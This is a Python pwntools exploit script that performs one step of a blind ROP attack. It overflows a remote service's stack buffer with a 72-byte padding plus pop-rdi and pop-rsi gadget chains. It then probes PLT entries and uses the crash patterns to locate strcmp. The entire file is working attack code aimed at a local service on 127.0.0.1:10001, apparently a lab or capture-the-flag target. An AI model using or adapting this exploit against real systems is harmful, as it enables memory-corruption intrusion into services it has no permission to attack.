from pwn import *

def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x40078a):
    
    # start before for false negative
    start_addr = plt_addr - 0x30
    good = plt_addr + 0xff
    bad = 0x000000
    
    # crashing behavior for strcmp()
    for i in range(num_entries):
        probe = start_addr + i * 0x10
        
        if (not call(probe, size, brop_addr, good, good) and
            call(probe, size, brop_addr, good, bad) and
            call(probe, size, brop_addr, bad, good) and
            call(probe, size, brop_addr, bad, bad)):
            
            return probe
        
    log.info("Not found!")
    return 0

# return: 
#    crash -> True; not crashed -> False
def call(probe, size, brop_addr, arg1, arg2):
    payload = size * b'A'
    payload += p64(brop_addr + 0x7) # pop rsi ; pop r15 ; ret
    payload += p64(arg1) * 2
    payload += p64(brop_addr + 0x9) # pop rdi ; ret
    payload += p64(arg2)
    payload += p64(probe)
    
    try:
        p = remote('127.0.0.1', 10001)
        p.recvline()
        p.sendline(payload)
        p.recvline()
        p.close()
        return False
    
    except EOFError:
        p.close()
        return True
    
    except Exception:
        p.close()
        return call(probe, size, brop_addr, arg1, arg2)

strcmp_addr = get_strcmp()
print("The address of strcmp is 0x%x" % strcmp_addr)
    
